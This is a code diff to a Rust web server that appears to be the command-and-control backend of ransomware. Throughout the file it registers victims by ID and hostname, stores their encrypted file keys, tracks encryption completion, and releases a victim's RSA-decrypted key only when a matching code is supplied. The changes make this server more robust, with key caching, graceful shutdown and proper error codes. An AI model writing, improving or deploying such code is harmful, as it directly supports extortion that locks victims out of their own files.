@@ -1,15 +1,18 @@
 use axum::{
     Router,
     extract::{self, State},
+    http::StatusCode,
     routing::post,
 };
 use axum_embed::ServeEmbed;
 use axum_server::tls_rustls::RustlsConfig;
 use hex::{decode, encode};
 use log::{debug, error, info, warn};
+use purecrypto::rsa::RsaPrivateKey;
 use rand::{RngExt, SeedableRng, rngs::StdRng};
 use rust_embed::RustEmbed;
-use std::{net::SocketAddr, time::SystemTime};
+use std::{net::SocketAddr, sync::Arc, time::Duration, time::SystemTime};
+use tokio::signal;
 
 mod config;
 mod models;
@@ -30,9 +33,12 @@ use coconut_crab_lib::{
     },
 };
 
+type RsaKey = RsaPrivateKey<RSA_LIMBS>;
+
 #[derive(Clone)]
 struct AppState {
     db: toasty::Db,
+    private_key: Arc<RsaKey>,
 }
 
 #[derive(RustEmbed, Clone)]
@@ -66,7 +72,18 @@ async fn main() {
         .expect("Failed to push database schema");
     debug!("Database schema pushed");
 
-    let shared_state = AppState { db };
+    // Parse the RSA private key once at startup and cache it.
+    let pem = String::from_utf8(
+        AssetPrivate::get("asym-priv-key.pem")
+            .expect("Failed to get private RSA key file")
+            .data
+            .to_vec(),
+    )
+    .expect("Failed to read PEM file");
+    let private_key = Arc::new(RsaKey::from_pkcs1_pem(&pem).expect("Failed to parse PEM key"));
+    debug!("RSA private key parsed and cached");
+
+    let shared_state = AppState { db, private_key };
     debug!("Web Application State Configured");
 
     let serve_public_assets = ServeEmbed::<AssetPublic>::new();
@@ -80,6 +97,36 @@ async fn main() {
         .with_state(shared_state);
     debug!("Routing Configured");
 
+    // Graceful shutdown handle
+    let handle = axum_server::Handle::new();
+    let server_handle = handle.clone();
+    tokio::spawn(async move {
+        let ctrl_c = async {
+            signal::ctrl_c()
+                .await
+                .expect("failed to install Ctrl+C handler");
+        };
+
+        #[cfg(unix)]
+        let terminate = async {
+            signal::unix::signal(signal::unix::SignalKind::terminate())
+                .expect("failed to install signal handler")
+                .recv()
+                .await;
+        };
+
+        #[cfg(not(unix))]
+        let terminate = std::future::pending::<()>();
+
+        tokio::select! {
+            _ = ctrl_c => {},
+            _ = terminate => {},
+        }
+
+        info!("Received termination signal, starting graceful shutdown");
+        server_handle.graceful_shutdown(Some(Duration::from_secs(30)));
+    });
+
     let addr = SocketAddr::from(([0, 0, 0, 0], config::PORT));
     debug!("Socket Address Configured");
 
@@ -87,17 +134,19 @@ async fn main() {
         rustls::crypto::aws_lc_rs::default_provider()
             .install_default()
             .expect("Failed to install rustls crypto provider");
-        let config = RustlsConfig::from_pem(get_tls_public_key(), get_tls_private_key())
+        let tls_config = RustlsConfig::from_pem(get_tls_public_key(), get_tls_private_key())
             .await
             .expect("Failed to configure web server TLS");
         debug!("TLS Configured");
 
-        axum_server::bind_rustls(addr, config)
+        axum_server::bind_rustls(addr, tls_config)
+            .handle(handle)
             .serve(app.into_make_service())
             .await
             .expect("Failed to start web server");
     } else {
         axum_server::bind(addr)
+            .handle(handle)
             .serve(app.into_make_service())
             .await
             .expect("Failed to start web server");
@@ -108,22 +157,25 @@ async fn main() {
 fn generate_code() -> String {
     let mut rng = StdRng::from_rng(&mut rand::rng());
     let code: String = (0..4)
-        .map(|_| {
-            (0..4)
-                .map(|_| {
-                    let random_char = rng.random_range(0..62);
-                    if random_char < 10 {
-                        (b'0' + random_char) as char
-                    } else if random_char < 36 {
-                        (b'A' + (random_char - 10)) as char
-                    } else {
-                        (b'a' + (random_char - 36)) as char
-                    }
-                })
-                .collect::<String>()
+        .flat_map(|i| {
+            let mut segment = String::with_capacity(4);
+            for _ in 0..4 {
+                let random_char = rng.random_range(0..62);
+                let c = if random_char < 10 {
+                    (b'0' + random_char) as char
+                } else if random_char < 36 {
+                    (b'A' + (random_char - 10)) as char
+                } else {
+                    (b'a' + (random_char - 36)) as char
+                };
+                segment.push(c);
+            }
+            if i < 3 {
+                segment.push('-');
+            }
+            segment.chars().collect::<Vec<_>>()
         })
-        .collect::<Vec<String>>()
-        .join("-");
+        .collect();
     debug!("Generated new code: {code}");
     code
 }
@@ -141,16 +193,7 @@ fn get_epoch_time() -> i64 {
     }
 }
 
-fn decrypt_key(key: &str) -> String {
-    let pem = String::from_utf8(
-        AssetPrivate::get("asym-priv-key.pem")
-            .expect("Failed to get private RSA key file")
-            .data
-            .to_vec(),
-    )
-    .expect("Failed to read PEM file");
-    let private_key = purecrypto::rsa::RsaPrivateKey::<RSA_LIMBS>::from_pkcs1_pem(&pem)
-        .expect("Failed to parse PEM key");
+fn decrypt_key(private_key: &RsaKey, key: &str) -> Result<String, &'static str> {
     let key_vec = match decode(key) {
         Ok(bytes) => {
             debug!("Decoded Key: {bytes:?}");
@@ -158,7 +201,7 @@ fn decrypt_key(key: &str) -> String {
         }
         Err(error) => {
             error!("Failed To Decode Key: {error}");
-            return String::from("Invalid Key");
+            return Err("Invalid Key");
         }
     };
     let key = match private_key.decrypt_pkcs1v15(&key_vec) {
@@ -168,65 +211,55 @@ fn decrypt_key(key: &str) -> String {
         }
         Err(error) => {
             error!("Failed To Decrypt Key: {error}");
-            return String::from("Invalid Key");
+            return Err("Invalid Key");
         }
     };
-    encode(key)
+    Ok(encode(key))
 }
 
 async fn register(
     State(state): State<AppState>,
     extract::Json(registration): extract::Json<Registration>,
-) -> String {
+) -> Result<&'static str, (StatusCode, &'static str)> {
     info!("Received request to register");
 
-    if validate_id(&registration.id) {
-        debug!("[{}] Valid ID: {}", registration.id, registration.id);
-    } else {
+    if !validate_id(&registration.id) {
         warn!("[] Invalid ID: {}", registration.id);
-        return String::from("Invalid ID");
+        return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
     }
 
-    if validate_hostname(&registration.hostname) {
-        debug!(
-            "[{}] Valid Hostname: {}",
-            registration.id, registration.hostname
-        );
-    } else {
+    if !validate_hostname(&registration.hostname) {
         warn!(
             "[{}] Invalid Hostname: {}",
             registration.id, registration.hostname
         );
-        return String::from("Invalid Hostname");
+        return Err((StatusCode::BAD_REQUEST, "Invalid Hostname"));
     }
 
-    if validate_proof(&registration.proof) {
-        debug!("[{}] Valid Proof: {}", registration.id, registration.proof);
-    } else {
+    if !validate_proof(&registration.proof) {
         warn!(
             "[{}] Invalid Proof: {}",
             registration.id, registration.proof
         );
-        return String::from("Invalid Proof");
+        return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
     }
 
     let mut proof_source = [registration.id.as_bytes(), registration.hostname.as_bytes()].concat();
-    if check_proof(
+    if !check_proof(
         &mut proof_source,
         config::PRESHARED_SECRET,
         &registration.proof,
     ) {
-        debug!(
-            "[{}] Proof Verification Success: {}",
-            registration.id, registration.proof
-        );
-    } else {
         warn!(
             "[{}] Proof Verification Failure: {}",
             registration.id, registration.proof
         );
-        return String::from("Invalid Proof");
+        return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
     }
+    debug!(
+        "[{}] Proof Verification Success: {}",
+        registration.id, registration.proof
+    );
 
     let mut db = state.db.clone();
 
@@ -235,10 +268,10 @@ async fn register(
     if victim_exists {
         warn!("[{}] Existing Victim Found", registration.id);
         warn!("[{}] Cannot Register New Victim", registration.id);
-        String::from("Victim already exists")
+        Err((StatusCode::CONFLICT, "Victim already exists"))
     } else {
         info!("[{}] Adding New Victim", registration.id);
-        toasty::create!(Victim {
+        if let Err(err) = toasty::create!(Victim {
             id: registration.id.clone(),
             hostname: registration.hostname.clone(),
             key: String::new(),
@@ -248,59 +281,55 @@ async fn register(
         })
         .exec(&mut db)
         .await
-        .expect("Failed to insert victim");
+        {
+            error!("[{}] Failed to insert victim: {err}", registration.id);
+            return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
+        }
         debug!("Inserted new victim into database");
-        String::from("Success")
+        Ok("Success")
     }
 }
 
 async fn upload_sym_key(
     State(state): State<AppState>,
     extract::Json(uploadsymkey): extract::Json<UploadSymKey>,
-) -> String {
+) -> Result<&'static str, (StatusCode, &'static str)> {
     info!("Received request to upload symmetric key");
 
-    if validate_id(&uploadsymkey.id) {
-        debug!("[{}] Valid ID: {}", uploadsymkey.id, uploadsymkey.id);
-    } else {
+    if !validate_id(&uploadsymkey.id) {
         warn!("[] Invalid ID: {}", uploadsymkey.id);
-        return String::from("Invalid ID");
+        return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
     }
 
-    if validate_key(&uploadsymkey.key) {
-        debug!("[{}] Valid Key: {}", uploadsymkey.id, uploadsymkey.key);
-    } else {
+    if !validate_key(&uploadsymkey.key) {
         warn!("[{}] Invalid Key: {}", uploadsymkey.id, uploadsymkey.key);
-        return String::from("Invalid Key");
+        return Err((StatusCode::BAD_REQUEST, "Invalid Key"));
     }
 
-    if validate_proof(&uploadsymkey.proof) {
-        debug!("[{}] Valid Proof: {}", uploadsymkey.id, uploadsymkey.proof);
-    } else {
+    if !validate_proof(&uploadsymkey.proof) {
         warn!(
             "[{}] Invalid Proof: {}",
             uploadsymkey.id, uploadsymkey.proof
         );
-        return String::from("Invalid Proof");
+        return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
     }
 
     let mut proof_source = [uploadsymkey.id.as_bytes(), uploadsymkey.key.as_bytes()].concat();
-    if check_proof(
+    if !check_proof(
         &mut proof_source,
         config::PRESHARED_SECRET,
         &uploadsymkey.proof,
     ) {
-        debug!(
-            "[{}] Proof Verification Success: {}",
-            uploadsymkey.id, uploadsymkey.proof
-        );
-    } else {
         warn!(
             "[{}] Proof Verification Failure: {}",
             uploadsymkey.id, uploadsymkey.proof
         );
-        return String::from("Invalid Proof");
+        return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
     }
+    debug!(
+        "[{}] Proof Verification Success: {}",
+        uploadsymkey.id, uploadsymkey.proof
+    );
 
     let mut db = state.db.clone();
 
@@ -309,21 +338,24 @@ async fn upload_sym_key(
         Err(_) => {
             warn!("[{}] Existing Victim Not Found", uploadsymkey.id);
             warn!("[{}] Cannot Upload Symmetric Key", uploadsymkey.id);
-            return String::from("Victim does not exist");
+            return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
         }
     };
 
     let code = generate_code();
     let upload_time = get_epoch_time();
 
-    victim
+    if let Err(err) = victim
         .update()
         .key(uploadsymkey.key.clone())
         .code(code.clone())
         .upload_time(upload_time)
         .exec(&mut db)
         .await
-        .expect("Failed to update victim");
+    {
+        error!("[{}] Failed to update victim: {err}", uploadsymkey.id);
+        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
+    }
 
     info!("[{}] Added Symmetric Key: {}", uploadsymkey.id, victim.key);
     info!("[{}] Added Code: {}", uploadsymkey.id, victim.code);
@@ -332,55 +364,44 @@ async fn upload_sym_key(
         uploadsymkey.id, victim.upload_time
     );
 
-    String::from("Success")
+    Ok("Success")
 }
 
 async fn announce_completion(
     State(state): State<AppState>,
     extract::Json(announcecompletion): extract::Json<AnnounceCompletion>,
-) -> String {
+) -> Result<&'static str, (StatusCode, &'static str)> {
     info!("Received request to announce completion");
 
-    if validate_id(&announcecompletion.id) {
-        debug!(
-            "[{}] Valid ID: {}",
-            announcecompletion.id, announcecompletion.id
-        );
-    } else {
+    if !validate_id(&announcecompletion.id) {
         warn!("[] Invalid ID: {}", announcecompletion.id);
-        return String::from("Invalid ID");
+        return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
     }
 
-    if validate_proof(&announcecompletion.proof) {
-        debug!(
-            "[{}] Valid Proof: {}",
-            announcecompletion.id, announcecompletion.proof
-        );
-    } else {
+    if !validate_proof(&announcecompletion.proof) {
         warn!(
             "[{}] Invalid Proof: {}",
             announcecompletion.id, announcecompletion.proof
         );
-        return String::from("Invalid Proof");
+        return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
     }
 
     let mut proof_source = announcecompletion.id.as_bytes().to_vec();
-    if check_proof(
+    if !check_proof(
         &mut proof_source,
         config::PRESHARED_SECRET,
         &announcecompletion.proof,
     ) {
-        debug!(
-            "[{}] Proof Verification Success: {}",
-            announcecompletion.id, announcecompletion.proof
-        );
-    } else {
         warn!(
             "[{}] Proof Verification Failure: {}",
             announcecompletion.id, announcecompletion.proof
         );
-        return String::from("Invalid Proof");
+        return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
     }
+    debug!(
+        "[{}] Proof Verification Success: {}",
+        announcecompletion.id, announcecompletion.proof
+    );
 
     let mut db = state.db.clone();
 
@@ -389,78 +410,66 @@ async fn announce_completion(
         Err(_) => {
             warn!("[{}] Existing Victim Not Found", announcecompletion.id);
             warn!("[{}] Cannot Announce Completion", announcecompletion.id);
-            return String::from("Victim does not exist");
+            return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
         }
     };
 
     info!("[{}] Designating As Complete", announcecompletion.id);
-    victim
-        .update()
-        .complete(true)
-        .exec(&mut db)
-        .await
-        .expect("Failed to update victim");
+    if let Err(err) = victim.update().complete(true).exec(&mut db).await {
+        error!(
+            "[{}] Failed to update victim completion: {err}",
+            announcecompletion.id
+        );
+        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
+    }
 
-    String::from("Success")
+    Ok("Success")
 }
 
 #[allow(clippy::too_many_lines)]
 async fn download_sym_key(
     State(state): State<AppState>,
     extract::Json(downloadsymkey): extract::Json<DownloadSymKey>,
-) -> String {
+) -> Result<String, (StatusCode, &'static str)> {
     info!("Received request to download symmetric key");
 
-    if validate_id(&downloadsymkey.id) {
-        debug!("[{}] Valid ID: {}", downloadsymkey.id, downloadsymkey.id);
-    } else {
+    if !validate_id(&downloadsymkey.id) {
         warn!("[] Invalid ID: {}", downloadsymkey.id);
-        return String::from("Invalid ID");
+        return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
     }
 
-    if validate_code(&downloadsymkey.code) {
-        debug!(
-            "[{}] Valid Code: {}",
-            downloadsymkey.id, downloadsymkey.code
-        );
-    } else {
+    if !validate_code(&downloadsymkey.code) {
         warn!(
             "[{}] Invalid Code: {}",
             downloadsymkey.id, downloadsymkey.code
         );
-        return String::from("Invalid Code");
+        return Err((StatusCode::BAD_REQUEST, "Invalid Code"));
     }
 
-    if validate_proof(&downloadsymkey.proof) {
-        debug!(
-            "[{}] Valid Proof: {}",
-            downloadsymkey.id, downloadsymkey.proof
-        );
-    } else {
+    if !validate_proof(&downloadsymkey.proof) {
         warn!(
             "[{}] Invalid Proof: {}",
             downloadsymkey.id, downloadsymkey.proof
         );
-        return String::from("Invalid Proof");
+        return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
     }
 
     let mut proof_source = [downloadsymkey.id.as_bytes(), downloadsymkey.code.as_bytes()].concat();
-    if check_proof(
+    if !check_proof(
         &mut proof_source,
         config::PRESHARED_SECRET,
         &downloadsymkey.proof,
     ) {
-        debug!(
-            "[{}] Proof Verification Success: {}",
-            downloadsymkey.id, downloadsymkey.proof
-        );
-    } else {
         warn!(
             "[{}] Proof Verification Failure: {}",
             downloadsymkey.id, downloadsymkey.proof
         );
-        return String::from("Invalid Proof");
+        return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
     }
+    debug!(
+        "[{}] Proof Verification Success: {}",
+        downloadsymkey.id, downloadsymkey.proof
+    );
 
     let mut db = state.db.clone();
 
@@ -475,7 +484,7 @@ async fn download_sym_key(
         Err(_) => {
             warn!("[{}] Existing Victim Not Found", downloadsymkey.id);
             warn!("[{}] Cannot Download Symmetric Key", downloadsymkey.id);
-            return String::from("Victim does not exist");
+            return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
         }
     };
 
@@ -520,11 +529,12 @@ async fn download_sym_key(
             downloadsymkey.id, downloadsymkey.code
         );
         info!("[{}] Providing Decrypted Key", downloadsymkey.id);
-        return decrypt_key(&existing_victim.key);
+        return decrypt_key(&state.private_key, &existing_victim.key)
+            .map_err(|e| (StatusCode::BAD_REQUEST, e));
     }
     warn!(
         "[{}] Incorrect Code: {}",
         downloadsymkey.id, downloadsymkey.code
     );
-    "Invalid Code".to_string()
+    Err((StatusCode::FORBIDDEN, "Invalid Code"))
 }
